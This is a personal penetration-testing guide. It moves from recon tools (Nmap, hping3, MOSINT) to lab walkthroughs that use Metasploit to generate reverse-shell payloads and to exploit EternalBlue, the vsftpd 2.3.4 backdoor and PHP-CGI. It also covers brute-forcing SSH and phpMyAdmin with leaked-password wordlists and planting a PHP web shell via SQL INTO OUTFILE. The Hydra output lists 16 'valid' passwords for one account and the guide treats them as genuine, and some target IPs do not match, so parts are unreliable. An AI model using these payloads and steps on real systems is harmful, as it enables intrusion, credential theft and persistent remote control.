# Penetration Testing Toolkit

![[Pasted image 20250322202023.png]]
## Table of Contents
- [Introduction](#introduction)
- [Tools Overview](#tools-overview)
  - [Photon](#photon)
  - [MOSINT](#mosint)
  - [Ping](#ping)
  - [Nmap](#nmap)
  - [Wireshark](#wireshark)
  - [Hping3](#hping3)
  - [Wappalyzer](#wappalyzer)
  - [Nmap Scripts](#nmap-scripts)
  - [Angry IP Scanner](#angry-ip-scanner)
  - [Metasploit Framework](#metasploit-framework)
- [Practical Examples](#practical-examples)
  - [SSH Exploitation Example](#ssh-exploitation-example)
  - [FTP Exploitation Example](#ftp-exploitation-example)
  - [HTTP Exploitation Example](#http-exploitation-example)
	  1. [OS Credential Dumping](#os-credential-dumping)
	  2. [Keylogging Techniques](#keylogging-techniques)
	  3. [Privilege Escalation Methods](#privilege-escalation-methods)
	  4. [File Hiding Techniques](#file-hiding-techniques)
	  5. [Steganography Examples](#steganography-examples) 
	  6. [Anti-Forensics Techniques](#anti-forensics-techniques)
	  7. [PowerCat](#Powercat)
	  8. [PDF Injection](#PDF-Injection)
- [Reporting Templates](#reporting-templates)
- [Conclusion](#conclusion)
## Introduction

This repository contains a detailed guide on using various penetration testing and network reconnaissance tools. Each tool is explained with installation instructions, usage examples, and sample outputs to help security professionals and ethical hackers conduct thorough security assessments.
## Tools Overview
#### Usage Example

```bash
photon -u https://www.nmap.org -l 3 -t 10 -o output_directory
```

#### Sample Output

![[Pasted image 20250322212823.png]]

Photon crawls the target website and extracts:

- **URLs (in-scope & out-of-scope)**
- **URLs with parameters (potential XSS/SQLi endpoints)**
- **Intel (emails, social media accounts, AWS/S3 buckets)**
- **Files (documents, images, etc.)**
- **Custom regex matches**
### MOSINT

MOSINT is an OSINT tool for emails, providing various information about the target email.

#### Installation

```bash
git clone https://github.com/alpkeskin/mosint.git
cd mosint
nano Dockerfile
# Replace FROM... by FROM docker.io/library/golang:1.21.0-alpine AS builder
sudo docker build -t mosint:latest .
sudo docker images
# You will see it
```

#### Usage Example

```bash
podman run -it --rm localhost/mosint hafedhgunichi@gmail.com
```

#### Sample Output

![[Pasted image 20250322220630.png]]

**MOSINT** can discover:

- **Email verification**
- **Domain reputation**
- **Data breach checks**
- **Social media presence**
- **Pastebin entries**
### Ping

Ping is a basic network utility used to test the reachability of a host on an IP network.

#### Usage Example

```bash
# Basic ping
ping nmap.org

# Specify count
ping -c 4 www.firebase.com

# Specify interval
ping -i 2 google.com
```

#### Sample Output

![[Pasted image 20250322220912.png]]
### Nmap

Nmap (Network Mapper) is a free and open-source utility for network discovery and security auditing.

#### Installation

```bash
# Debian/Ubuntu
sudo apt install nmap
```

#### Usage Examples

```bash
# Basic scan
nmap 192.168.1.1

# Scan a range
nmap 192.168.1.1-254

# Scan specific ports
nmap -p 22,80,443 nmap.org

# Aggressive scan
nmap -A nmap.org

# OS detection
nmap -O nmap.org

# Service version detection
nmap -sV nmap.org
```

#### Sample Output

![[Pasted image 20250322221026.png]]
### Wireshark

Wireshark is a network protocol analyzer that lets you capture and interactively browse the traffic running on a computer network.

#### Installation

```bash
# Debian/Ubuntu
sudo apt install wireshark
```

#### Usage

Wireshark is primarily used through its GUI interface, but can also be used via the command line with tshark:

```bash
# Capture packets on interface eth0
tshark -i eth0

# Capture packets with a filter
tshark -i eth0 -f "port 80"

# Save capture to a file
tshark -i eth0 -w capture.pcap
```

#### Sample Output

![[Pasted image 20250322221136.png]]
### Hping3

Hping3 is a command-line oriented TCP/IP packet assembler/analyzer that can be used for network testing and firewall auditing.
#### Installation

```bash
# Debian/Ubuntu
sudo apt install hping3
```

#### Usage Examples

```bash
# TCP SYN scan on port 80
sudo hping3 -S -p 80 nmap.org

# TCP scan with custom flags
sudo hping3 -SAUPF -p 80 nmap.org

# ICMP ping
sudo hping3 -1 nmap.org

# UDP scan
sudo hping3 -2 -p 53 nmap.org

# Traceroute
sudo hping3 --traceroute -V -1 nmap.org
```

#### Sample Output

![[Pasted image 20250322222012.png]]
### Wappalyzer

**Wappalyzer** is a browser extension that uncovers the technologies used on websites, including content management systems, e-commerce platforms, web servers, JavaScript frameworks, and analytics tools.

#### Installation

Install from browser extension stores:

- [Chrome Extension](https://chrome.google.com/webstore/detail/wappalyzer/gppongmhjkpfnbhagpmjfkannfbllamg)
- [Firefox Add-on](https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/)
#### Sample Output

![[Pasted image 20250322222241.png]]
### Nmap Scripts

Nmap Scripting Engine (NSE) extends Nmap's functionality with scripts for various tasks like advanced service detection, vulnerability detection, and exploitation.

#### Usage Examples

```bash
# List available scripts
ls /usr/share/nmap/scripts/

# Run default scripts
nmap -sC nmap.org

# Run specific script
nmap --script=http-title nmap.org

# Run script category
nmap --script=vuln nmap.org

# Run multiple scripts
nmap --script=http-headers,http-methods nmap.org
```

#### Sample Output

![[Pasted image 20250322222332.png]]
![[Pasted image 20250322222521.png]]
### Angry IP Scanner

Angry IP Scanner is a fast and feature-rich IP address and port scanner.

#### Installation

```bash
# Debian/Ubuntu
sudo apt install ipscan

# Download the debian .deb from website
curl https://angryip.org/download/
cd ~/Downloads/
sudo dpkg -i ipscan_3.9.1_amd64.deb
```

#### Usage

Angry IP Scanner is primarily used through its GUI interface, but can also be used via the command line:

```bash
# Scan IP range
ipscan 192.168.1.0-192.168.1.255

# Scan with specific ports
ipscan 192.168.1.0-192.168.1.255 -p 22,80,443
```

#### Sample Output

![[Pasted image 20250322223946.png]]
### Metasploit Framework

The Metasploit Framework is a powerful tool for developing, testing, and executing exploits against target systems.

#### Installation

```bash
# Debian/Ubuntu
sudo apt install metasploit-framework

# Kali Linux (pre-installed)
sudo apt update
sudo apt upgrade metasploit-framework
```

#### MSFVenom Usage Examples

MSFVenom is used to generate payloads:

```bash
# List payloads
msfvenom -l payloads

# Generate a Windows reverse shell executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe

# Generate a Linux ELF binary
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > shell.elf

# Generate a PHP web payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > shell.php
```

#### MSFConsole Usage Examples

MSFConsole is the main interface to the Metasploit Framework:

```bash
# Start MSFConsole
msfconsole

# Search for exploits
search type:exploit platform:windows ms17-010

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue

# Set options
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444

# Run the exploit
exploit
```

#### Sample Output

![[Pasted image 20250322224047.png]]
![[Pasted image 20250322224139.png]]
## Practical Examples

### Comprehensive Network Scan

This example demonstrates a comprehensive network reconnaissance workflow:

1. **Discover live hosts with Ping sweep**:

```bash
for ip in $(seq 1 254); do ping -c 1 192.168.74.$ip | grep "bytes from" | cut -d" " -f4 | cut -d":" -f1 & done
```

![[Pasted image 20250322224245.png]]

2. **Scan discovered hosts with Nmap**:

```bash
nmap -sV -O -A -T4 -oA network_scan 192.168.74.146
```

![[Pasted image 20250322224716.png]]

3. **Targeted service enumeration**:

```bash
nmap --script=smb-enum-shares,smb-enum-users 192.168.74.146
```

![[Pasted image 20250322224830.png]]

4. **Vulnerability scanning**:

```bash
nmap --script=vuln 192.168.74.146
```

![[Pasted image 20250322224941.png]]

---

## Practical Examples

### SSH Exploitation Example

1. **SSH Brute Force Attack with Metasploit**:

   First, we identify an open SSH port (22/TCP) during our initial scan:

   ```bash
   nmap -p 22 192.168.74.162
   ```

![[Pasted image 20250408092549.png]]

Then, we prepare and execute a brute force attack using Metasploit's **ssh_login** module:

   ```bash
   msf6 > use auxiliary/scanner/ssh/ssh_login

   msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.74.136

   RHOSTS => 192.168.74.136

   msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME root

   USERNAME => root

   msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/worslists/rockyou.txt

   PASS_FILE => /usr/share/worslists/rockyou.txt

   msf6 auxiliary(scanner/ssh/ssh_login) > set THREADS 10

   THREADS => 10

   msf6 auxiliary(scanner/ssh/ssh_login) > run

   [*] 192.168.74.162:22 - Starting bruteforce

   ```



   The attack attempts to find the correct password for the root user by trying each password from the rockyou.txt wordlist. If successful, Metasploit will establish an SSH session that can be used for further exploitation.

2. **Post-Exploitation After Successful SSH Login**:

   Once a valid credential is found, we can:

   ```bash

   # Establish SSH session

   ssh root@192.168.74.162

   # Gather system information

   uname -a

   cat /etc/issue

   # Check for sensitive files

   find / -name "*.conf" -type f 2>/dev/null

   find / -name "*.key" -type f 2>/dev/null

   # Check for other users

   cat /etc/passwd

   ```

   ![SSH Post Exploitation](/images/ssh-post-exploitation.png)
---

### FTP Exploitation Example

1. **FTP Service Identification and Exploitation**:
   First, we identify an open FTP port (21/TCP) and check the version:

   ```bash

   msf6 > use auxiliary/scanner/ftp/ftp_version

   msf6 auxiliary(scanner/ftp/ftp_version) > set RHOSTS 192.168.74.162

   RHOSTS => 192.168.74.162

   msf6 auxiliary(scanner/ftp/ftp_version) > run

   [+] 192.168.74.162:21 - FTP Banner: '220 (vsFTPd 2.3.4)\x0d\x0a'

   [*] 192.168.74.162:21 - Scanned 1 of 1 hosts (100% complete)

   [*] Auxiliary module execution completed

   ```

![[Pasted image 20250408094640.png]]
  
After identifying the vulnerable vsFTPd 2.3.4 version, we search for related exploits:

   ```bash

   msf6 auxiliary(scanner/ftp/ftp_version) > search vsFTPd

   Matching Modules

   ================

   # Name Disclosure Date Rank Check Description

   - ---- --------------- ---- ----- -----------

   0 auxiliary/dos/ftp/vsftpd_232 2011-02-03 normal Yes VSFTPD 2.3.2 Denial of Service

   1 exploit/unix/ftp/vsftpd_234_backdoor 2011-07-03 excellent No VSFTPD v2.3.4 Backdoor Command Execution

   Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor

   ```

![[Pasted image 20250408094730.png]]

Then, we use the **vsftpd_234_backdoor** exploit to gain shell access:

   ```bash

   msf6 auxiliary(scanner/ftp/ftp_version) > use exploit/unix/ftp/vsftpd_234_backdoor

   [*] No payload configured, defaulting to cmd/unix/interact

   [-] Msf::OptionValidateError One or more options failed to validate: RHOSTS.

   msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.74.162

   RHOSTS => 192.168.74.162

   msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RPORT 21

   RPORT => 21

   msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

   ```

![[Pasted image 20250408094935.png]]

2. **Post-Exploitation After FTP Backdoor Access**: 

  After gaining shell access, we can perform various post-exploitation activities:

   ```bash

   # Check user and system information

   id

   whoami

   uname -a

   # Escalate privileges if needed

   sudo -l

   # Gather sensitive information

   cat /etc/passwd

   cat /etc/shadow

   # Look for configuration files

   find /etc -name "*.conf" | grep ftp

   ```

![[Pasted image 20250408095241.png]]
![[Pasted image 20250408095314.png]]
![[Pasted image 20250408095332.png]]

The vsftpd 2.3.4 backdoor is a famous vulnerability that allows attackers to gain a shell on the target system by sending a specially crafted username containing a smiley face ":)" during the login process.

----
### HTTP Exploitation Example

1. **Vulnerability Identification with Nikto**:
   First, we scan the web server using Nikto to identify potential vulnerabilities:

   ```bash

   $ nikto -h http://192.168.74.162

   - Nikto v2.5.0

   ---------------------------------------------------------------------------

   + Target IP: 192.168.74.162

   + Target Hostname: 192.168.74.162

   + Target Port: 80

   + Start Time: 2025-03-27 14:51:47 (GMT-4)

   ---------------------------------------------------------------------------

   + Server: Apache/2.2.8 (Ubuntu) DAV/2

   + /: Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10.

   + /: The anti-clickjacking X-Frame-Options header is not present.

   + /: The X-Content-Type-Options header is not set.

   + Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.54).

   + /index: Uncommon header 'tcn' found, with contents: list.

   + /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names.

   + /: Web Server returns a valid response with junk HTTP methods which may cause false positives.

   + /: HTTP TRACE method is active which suggests the host is vulnerable to XST.

   + /phpinfo.php: Output from the phpinfo() function was found.

   + /doc/: Directory indexing found.

   + /doc/: The /doc/ directory is browsable.

   + /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests.

   + /phpMyAdmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected.

   + /phpMyAdmin/ChangeLog: Server may leak inodes via ETags.

   + /test/: Directory indexing found.

   + /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found.

   + /icons/: Directory indexing found.

   + /phpMyAdmin/: phpMyAdmin directory found.

   + /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.

   ```

![[Pasted image 20250408095925.png]]

   Key findings from the Nikto scan:
   - Apache 2.2.8 (outdated)
   - PHP 5.2.4 (vulnerable)
   - phpMyAdmin installation (potential access to database)
   - phpinfo.php file (information disclosure)
   - Directory indexing enabled in multiple locations
   - Potential WordPress configuration file exposed

2. **Remote Code Execution (RCE) via PHP CGI Vulnerability**:  

   The server is running PHP 5.2.4, which is vulnerable to CVE-2012-1823 (PHP CGI Argument Injection). We can exploit this using Metasploit:

   ```bash

   └─$ msfconsole

   msf6 > use exploit/multi/http/php_cgi_arg_injection

   [*] No payload configured, defaulting to php/meterpreter/reverse_tcp

   msf6 exploit(multi/http/php_cgi_arg_injection) > set RHOSTS 192.168.74.162

   RHOSTS => 192.168.74.162

   msf6 exploit(multi/http/php_cgi_arg_injection) > set RPORT 80

   RPORT => 80

   msf6 exploit(multi/http/php_cgi_arg_injection) > set TARGETURI /cgi-bin/php

   TARGETURI => /cgi-bin/php

   msf6 exploit(multi/http/php_cgi_arg_injection) > set PAYLOAD php/meterpreter/reverse_tcp

   PAYLOAD => php/meterpreter/reverse_tcp

   msf6 exploit(multi/http/php_cgi_arg_injection) > set LHOST 192.168.74.136

   LHOST => 192.168.74.136

   msf6 exploit(multi/http/php_cgi_arg_injection) > set LPORT 4444

   LPORT => 4444

   msf6 exploit(multi/http/php_cgi_arg_injection) > exploit

   ```

![[Pasted image 20250408100247.png]]
 
After successful exploitation, we can access system files:

   ```bash

   meterpreter > cat /etc/passwd

   ```

![[Pasted image 20250408100310.png]]

3. **phpMyAdmin Access via Brute Force**:

   We identified phpMyAdmin at `/phpMyAdmin/`. Let's brute force the login credentials using Hydra:
#### Default Wordlist Locations in Kali Linux

Here's a comprehensive list of wordlists available on a standard Kali Linux installation that you can use for password attacks:
## 1. General Purpose Wordlists

| Wordlist | Location | Size | Description |
|----------|----------|------|-------------|
| rockyou.txt | `/usr/share/wordlists/rockyou.txt` | 133 MB | Most common wordlist, contains ~14 million passwords from leaked databases |
| fasttrack.txt | `/usr/share/wordlists/fasttrack.txt` | 222 KB | Small list of very common passwords for quick testing |
| dirb (common.txt) | `/usr/share/dirb/wordlists/common.txt` | 34 KB | Common words, originally for directory brute forcing |
| dirb (big.txt) | `/usr/share/dirb/wordlists/big.txt` | 172 KB | Larger collection of common words |
| crackstation-human-only.txt | Download from crackstation.net | 64 MB | Human passwords from CrackStation's collection |
| crackstation.txt | Purchase from crackstation.net | 15 GB | Massive wordlist of passwords |
| weakpass_2 | Download from weakpass.com | 1.4 GB | Collection of passwords from various leaks |
| weakpass_3 | Download from weakpass.com | 8.5 GB | Larger collection of passwords |

## 2. SecLists Collection (Located at `/usr/share/seclists/Passwords/`)

### Common Passwords

| Wordlist | Location | Size | Description |
|----------|----------|------|-------------|
| 10-million-password-list-top-100.txt | `/usr/share/seclists/Passwords/Common-Credentials/` | 765 B | Top 100 most common passwords |
| 10-million-password-list-top-1000.txt | `/usr/share/seclists/Passwords/Common-Credentials/` | 8 KB | Top 1000 most common passwords |
| 10-million-password-list-top-10000.txt | `/usr/share/seclists/Passwords/Common-Credentials/` | 82 KB | Top 10000 most common passwords |
| 10-million-password-list-top-100000.txt | `/usr/share/seclists/Passwords/Common-Credentials/` | 791 KB | Top 100000 most common passwords |
| 10-million-password-list-top-1000000.txt | `/usr/share/seclists/Passwords/Common-Credentials/` | 7.6 MB | Top 1000000 most common passwords |
| 100k-most-used-passwords-NCSC.txt | `/usr/share/seclists/Passwords/Common-Credentials/` | 791 KB | 100,000 most common passwords according to NCSC |
| 500-worst-passwords.txt | `/usr/share/seclists/Passwords/Common-Credentials/` | 3.5 KB | 500 worst passwords to use |
| top-20-common-SSH-passwords.txt | `/usr/share/seclists/Passwords/Common-Credentials/` | 135 B | 20 most common SSH passwords |
| best1050.txt | `/usr/share/seclists/Passwords/Common-Credentials/` | 8 KB | 1050 common passwords |

### Default Credentials

| Wordlist | Location | Description |
|----------|----------|-------------|
| ftp-betterdefaultpasslist.txt | `/usr/share/seclists/Passwords/Default-Credentials/` | Default FTP credentials |
| ssh-betterdefaultpasslist.txt | `/usr/share/seclists/Passwords/Default-Credentials/` | Default SSH credentials |
| mysql-betterdefaultpasslist.txt | `/usr/share/seclists/Passwords/Default-Credentials/` | Default MySQL/phpMyAdmin credentials |
| mssql-betterdefaultpasslist.txt | `/usr/share/seclists/Passwords/Default-Credentials/` | Default MSSQL credentials |
| oracle-betterdefaultpasslist.txt | `/usr/share/seclists/Passwords/Default-Credentials/` | Default Oracle credentials |
| postgres-betterdefaultpasslist.txt | `/usr/share/seclists/Passwords/Default-Credentials/` | Default PostgreSQL credentials |
| tomcat-betterdefaultpasslist.txt | `/usr/share/seclists/Passwords/Default-Credentials/` | Default Tomcat credentials |
| windows-betterdefaultpasslist.txt | `/usr/share/seclists/Passwords/Default-Credentials/` | Default Windows credentials |

### Leaked Databases

| Wordlist | Location | Description |
|----------|----------|-------------|
| Ashley-Madison.txt | `/usr/share/seclists/Passwords/Leaked-Databases/` | Passwords from Ashley Madison breach |
| Lizard-Squad.txt | `/usr/share/seclists/Passwords/Leaked-Databases/` | Passwords from Lizard Squad breach |
| NordVPN.txt | `/usr/share/seclists/Passwords/Leaked-Databases/` | Passwords from NordVPN breach |
| adobe100.txt | `/usr/share/seclists/Passwords/Leaked-Databases/` | Top 100 passwords from Adobe breach |
| alleged-gmail-passwords.txt | `/usr/share/seclists/Passwords/Leaked-Databases/` | Alleged Gmail passwords from leaks |
| burnett_top_1000.txt | `/usr/share/seclists/Passwords/Leaked-Databases/` | Top 1000 passwords collected by Mark Burnett |
| elitehacker.txt | `/usr/share/seclists/Passwords/Leaked-Databases/` | Passwords from EliteHacker breach |
| faithwriters.txt | `/usr/share/seclists/Passwords/Leaked-Databases/` | Passwords from FaithWriters breach |
| hak5.txt | `/usr/share/seclists/Passwords/Leaked-Databases/` | Passwords from Hak5 breach |
| honeynet.txt | `/usr/share/seclists/Passwords/Leaked-Databases/` | Passwords from HoneyNet captures |
| hotmail.txt | `/usr/share/seclists/Passwords/Leaked-Databases/` | Passwords from Hotmail breach |
| linkedin-passwords.txt | `/usr/share/seclists/Passwords/Leaked-Databases/` | Passwords from LinkedIn breach |
| myspace.txt | `/usr/share/seclists/Passwords/Leaked-Databases/` | Passwords from MySpace breach |
| phpbb.txt | `/usr/share/seclists/Passwords/Leaked-Databases/` | Passwords from phpBB breaches |
| rockyou-10.txt | `/usr/share/seclists/Passwords/Leaked-Databases/` | Top 10 passwords from RockYou breach |
| rockyou-15.txt | `/usr/share/seclists/Passwords/Leaked-Databases/` | Top 15 passwords from RockYou breach |
| rockyou-20.txt | `/usr/share/seclists/Passwords/Leaked-Databases/` | Top 20 passwords from RockYou breach |
| rockyou-30.txt | `/usr/share/seclists/Passwords/Leaked-Databases/` | Top 30 passwords from RockYou breach |
| rockyou-40.txt | `/usr/share/seclists/Passwords/Leaked-Databases/` | Top 40 passwords from RockYou breach |
| rockyou-50.txt | `/usr/share/seclists/Passwords/Leaked-Databases/` | Top 50 passwords from RockYou breach |
| rockyou-75.txt | `/usr/share/seclists/Passwords/Leaked-Databases/` | Top 75 passwords from RockYou breach |
| twitter-banned.txt | `/usr/share/seclists/Passwords/Leaked-Databases/` | Passwords banned by Twitter |

### WiFi Passwords

| Wordlist | Location | Description |
|----------|----------|-------------|
| WiFi-WPA | `/usr/share/seclists/Passwords/WiFi-WPA/` | Various wordlists for WiFi WPA cracking |
| probable-v2-wpa-top4800.txt | `/usr/share/seclists/Passwords/WiFi-WPA/` | 4800 probable WiFi passwords |
| probable-v2-wpa-top62.txt | `/usr/share/seclists/Passwords/WiFi-WPA/` | 62 most probable WiFi passwords |

## 3. John the Ripper Wordlists

| Wordlist | Location | Description |
|----------|----------|-------------|
| password.lst | `/usr/share/john/password.lst` | Default John the Ripper wordlist |
| all.lst | `/usr/share/john/` | Combined wordlist |

## 4. Specialized and Language-Specific Wordlists

| Wordlist | Location | Description |
|----------|----------|-------------|
| dutch_passwords.txt | `/usr/share/seclists/Passwords/Leaked-Databases/` | Dutch passwords |
| german_passwords.txt | `/usr/share/seclists/Passwords/Leaked-Databases/` | German passwords |
| spanish_passwords.txt | `/usr/share/seclists/Passwords/Leaked-Databases/` | Spanish passwords |
| french_passwords.txt | `/usr/share/seclists/Passwords/Leaked-Databases/` | French passwords |
| italian_passwords.txt | `/usr/share/seclists/Passwords/Leaked-Databases/` | Italian passwords |
| russian_passwords.txt | `/usr/share/seclists/Passwords/Leaked-Databases/` | Russian passwords |
| probable-v2-top12000.txt | `/usr/share/seclists/Passwords/probable-v2-top12000.txt` | 12,000 probable passwords |
| xato-net-10-million-passwords.txt | `/usr/share/seclists/Passwords/xato-net-10-million-passwords.txt` | 10 million passwords from xato.net |
| xato-net-10-million-passwords-1000.txt | `/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt` | Top 1000 from xato.net collection |
| xato-net-10-million-passwords-10000.txt | `/usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt` | Top 10000 from xato.net collection |
| xato-net-10-million-passwords-100000.txt | `/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt` | Top 100000 from xato.net collection |

## 5. Wordlists for Specific Services

### Web Applications

| Wordlist | Location | Description |
|----------|----------|-------------|
| web-extensions.txt | `/usr/share/seclists/Discovery/Web-Content/` | Web file extensions |
| common-api-endpoints-mazen160.txt | `/usr/share/seclists/Discovery/Web-Content/` | Common API endpoints |
| swagger-wordlist.txt | `/usr/share/seclists/Discovery/Web-Content/` | Swagger API endpoints |
| api-endpoints.txt | `/usr/share/seclists/Discovery/Web-Content/` | API endpoints |
| graphql.txt | `/usr/share/seclists/Discovery/Web-Content/` | GraphQL endpoints |

### Database Services

| Wordlist | Location | Description |
|----------|----------|-------------|
| mysql-common-login.txt | `/usr/share/seclists/Passwords/Default-Credentials/` | Common MySQL logins |
| postgres-default.txt | `/usr/share/seclists/Passwords/Default-Credentials/` | Default PostgreSQL credentials |
| db2-default.txt | `/usr/share/seclists/Passwords/Default-Credentials/` | Default DB2 credentials |
| oracle-default.txt | `/usr/share/seclists/Passwords/Default-Credentials/` | Default Oracle credentials |

### Remote Access Services

| Wordlist | Location | Description |
|----------|----------|-------------|
| ssh-common.txt | `/usr/share/seclists/Passwords/Default-Credentials/` | Common SSH credentials |
| rdp-default.txt | `/usr/share/seclists/Passwords/Default-Credentials/` | Default RDP credentials |
| telnet-default.txt | `/usr/share/seclists/Passwords/Default-Credentials/` | Default Telnet credentials |
| vnc-default.txt | `/usr/share/seclists/Passwords/Default-Credentials/` | Default VNC credentials |

## 6. Custom Wordlist Generation Tools

| Tool | Command | Description |
|------|---------|-------------|
| CUPP | `python3 cupp.py -i` | Interactive tool to create custom wordlists based on target information |
| CeWL | `cewl -d 2 -m 5 -w custom_wordlist.txt http://192.168.74.162` | Generate wordlists from website content |
| Crunch | `crunch 8 10 -t password%%` | Generate pattern-based wordlists |
| John the Ripper (rules) | `john --wordlist=base.txt --rules --stdout > expanded.txt` | Apply rules to existing wordlists |
| Hashcat (rules) | `hashcat --force base.txt -r rules/best64.rule --stdout > expanded.txt` | Apply rules to existing wordlists |

## 7. Recommended Wordlists by Attack Scenario

### For phpMyAdmin Brute Force

1. **First Try** (Quick Check):
   - `/usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt`
   - `/usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt`
   - `/usr/share/wordlists/fasttrack.txt`

2. **Second Try** (Common Passwords):
   - `/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt`
   - `/usr/share/seclists/Passwords/Common-Credentials/best1050.txt`

3. **Third Try** (More Comprehensive):
   - `/usr/share/wordlists/rockyou.txt` (most common)
   - `/usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt`

4. **Last Resort** (Targeted):
   - Custom wordlist generated with CeWL from the target website
   - Custom wordlist generated with CUPP based on organization information

### For SSH Brute Force

1. **First Try** (Quick Check):
   - `/usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt`
   - `/usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt`
   - `/usr/share/wordlists/fasttrack.txt`

2. **Second Try** (Common Passwords):
   - `/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt`
   - `/usr/share/seclists/Passwords/Common-Credentials/best1050.txt`

3. **Third Try** (More Comprehensive):
   - `/usr/share/wordlists/rockyou.txt`
   - `/usr/share/seclists/Passwords/probable-v2-top12000.txt`

### For FTP Brute Force

1. **First Try** (Quick Check):
   - `/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt`
   - `/usr/share/wordlists/fasttrack.txt`

2. **Second Try** (Common Passwords):
   - `/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt`

3. **Third Try** (More Comprehensive):
   - `/usr/share/wordlists/rockyou.txt`

## 8. Command Examples for Different Wordlists

### Hydra with Different Wordlists for phpMyAdmin

```bash
# Default MySQL credentials
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt 192.168.74.162 http-post-form "/phpMyAdmin/index.php:username=^USER^&password=^PASS^:F=error"

# Top 1000 common passwords
hydra -l root -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt 192.168.74.162 http-post-form "/phpMyAdmin/index.php:username=^USER^&password=^PASS^:F=error"

# Fasttrack wordlist (small but effective)
hydra -l root -P /usr/share/wordlists/fasttrack.txt 192.168.74.162 http-post-form "/phpMyAdmin/index.php:username=^USER^&password=^PASS^:F=error"

# Website-specific wordlist
cewl -d 2 -m 5 -w custom_wordlist.txt http://192.168.74.162
hydra -l root -P custom_wordlist.txt 192.168.74.162 http-post-form "/phpMyAdmin/index.php:username=^USER^&password=^PASS^:F=error"

```

```bash

   └─$ hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.74.162 http-post-form "/phpMyAdmin/index.php:username=^USER^&password=^PASS^:F=error"

   Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak

   [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task

   [DATA] attacking http-post-form://192.168.74.162:80/phpMyAdmin/index.php:username=^USER^&password=^PASS^:F=error

   [80][http-post-form] host: 192.168.74.162 login: root password: babygirl
   [80][http-post-form] host: 192.168.74.162 login: root password: 1234567
   [80][http-post-form] host: 192.168.74.162 login: root password: 12345
   [80][http-post-form] host: 192.168.74.162 login: root password: password
   [80][http-post-form] host: 192.168.74.162 login: root password: monkey
   [80][http-post-form] host: 192.168.74.162 login: root password: nicole
   [80][http-post-form] host: 192.168.74.162 login: root password: 123456789
   [80][http-post-form] host: 192.168.74.162 login: root password: abc123
   [80][http-post-form] host: 192.168.74.162 login: root password: princess
   [80][http-post-form] host: 192.168.74.162 login: root password: daniel
   [80][http-post-form] host: 192.168.74.162 login: root password: 123456
   [80][http-post-form] host: 192.168.74.162 login: root password: iloveyou
   [80][http-post-form] host: 192.168.74.162 login: root password: lovely
   [80][http-post-form] host: 192.168.74.162 login: root password: rockyou
   [80][http-post-form] host: 192.168.74.162 login: root password: jessica
   [80][http-post-form] host: 192.168.74.162 login: root password: 12345678

   1 of 1 target successfully completed, 16 valid passwords found

   ```

![[Pasted image 20250408100656.png]]

4. **Web Shell Deployment via phpMyAdmin**:  

   After successfully logging into phpMyAdmin with the credentials found during the brute force attack, you can deploy a web shell using one of these methods:

   **Method 1: Direct File Write Using SQL**

   1. Log in to phpMyAdmin using the credentials found (e.g., username: root, password: 123456)
   2. Click on the "SQL" tab at the top of the interface
   3. Enter the following SQL command to write a PHP web shell directly to the web server's directory:

   ```sql
   SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php";
   ```

   4. If you encounter a permission error, try different web-accessible directories:

   ```sql

   -- Try alternative directories if the first attempt fails

   SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/shell.php";

   -- or

   SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/images/shell.php";

   -- or

   SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/tmp/shell.php";

   ```

   5. After successful execution, access your web shell:

   ```bash

   http://192.168.74.162/shell.php?cmd=id

   http://192.168.74.162/shell.php?cmd=whoami

   http://192.168.74.162/shell.php?cmd=ls%20-la

   ```
   ![phpMyAdmin SQL Injection](/images/phpmyadmin-sql.png)
   ![Web Shell Execution](/images/webshell-execution.png)
   **Method 2: Modify Existing Database Content**

   If the direct file write method doesn't work due to permissions:

   1. In phpMyAdmin, browse the available databases in the left panel
   2. Look for content management databases (like WordPress, Joomla, Drupal)
